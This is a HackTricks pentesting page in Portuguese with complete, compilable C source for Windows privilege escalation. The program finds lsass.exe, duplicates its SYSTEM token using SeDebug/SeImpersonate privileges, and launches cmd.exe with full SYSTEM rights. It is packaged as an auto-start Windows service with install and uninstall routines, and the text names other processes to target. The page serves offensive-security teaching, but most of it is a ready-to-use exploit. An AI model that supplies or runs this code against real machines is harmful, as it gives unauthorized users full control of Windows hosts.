O seguinte código explora os privilégios SeDebug e SeImpersonate para copiar o token de um processo em execução como SYSTEM e com todos os privilégios do token. Neste caso, este código pode ser compilado e usado como um binário de serviço do Windows para verificar se está funcionando. No entanto, a parte principal do código onde ocorre a elevação está dentro da função `Exploit`. Dentro dessa função, você pode ver que o processo `lsass.exe` é procurado, em seguida, seu token é copiado e, finalmente, esse token é usado para gerar um novo `cmd.exe` com todos os privilégios do token copiado. Outros processos em execução como SYSTEM com todos ou a maioria dos privilégios do token são: `services.exe`, `svhost.exe` (um dos primeiros), `wininit.exe`, `csrss.exe`... (lembre-se de que você não poderá copiar um token de um processo protegido). Além disso, você pode usar a ferramenta Process Hacker em execução como administrador para ver os tokens de um processo.
```c
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
			
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
			
	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) {
			CloseHandle(hProcSnap);
			return 0;
	}
			
	while (Process32Next(hProcSnap, &pe32)) {
			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
					pid = pe32.th32ProcessID;
					break;
			}
	}
			
	CloseHandle(hProcSnap);
			
	return pid;
}


int Exploit(void) {
	
    HANDLE hSystemToken, hSystemProcess;
	HANDLE dupSystemToken = NULL;
    HANDLE hProcess, hThread;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	int pid = 0;


    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

	// open high privileged process
	if ( pid = FindTarget("lsass.exe") ) 
		hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	else
		return -1;
	
	// extract high privileged token
    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return -1;
    }
	
	// make a copy of a token
	DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);	

	// and spawn a new process with higher privs
    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe", 
						NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
	switch ( controlCode ) {
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
			SetServiceStatus( serviceStatusHandle, &serviceStatus );

			SetEvent( stopServiceEvent );
			return;

		case SERVICE_CONTROL_PAUSE:
			break;

		case SERVICE_CONTROL_CONTINUE:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
	SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
	// initialise service status
	serviceStatus.dwServiceType = SERVICE_WIN32;
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	serviceStatus.dwControlsAccepted = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

	if ( serviceStatusHandle ) {
		// service is starting
		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do initialisation here
		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

		// running
		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		Exploit();
		WaitForSingleObject( stopServiceEvent, -1 );

		// service was stopped
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do cleanup here
		CloseHandle( stopServiceEvent );
		stopServiceEvent = 0;

		// service is now stopped
		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );
	}
}


void InstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

	if ( serviceControlManager ) {
		TCHAR path[ _MAX_PATH + 1 ];
		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
			SC_HANDLE service = CreateService( serviceControlManager,
							serviceName, serviceName,
							SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
							SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
							0, 0, 0, 0, 0 );
			if ( service )
				CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

void UninstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

	if ( serviceControlManager ) {
		SC_HANDLE service = OpenService( serviceControlManager,
			serviceName, SERVICE_QUERY_STATUS | DELETE );
		if ( service ) {
			SERVICE_STATUS serviceStatus;
			if ( QueryServiceStatus( service, &serviceStatus ) ) {
				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
					DeleteService( service );
			}
			CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

int _tmain( int argc, TCHAR* argv[] )
{
	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
		InstallService();
	}
	else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
		UninstallService();
	}
	else  {
		SERVICE_TABLE_ENTRY serviceTable[] = {
			{ serviceName, ServiceMain },
			{ 0, 0 }
		};
	
		StartServiceCtrlDispatcher( serviceTable );
	}	

	return 0;
}
```
**O código deste exemplo foi compartilhado por uma pessoa anônima.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
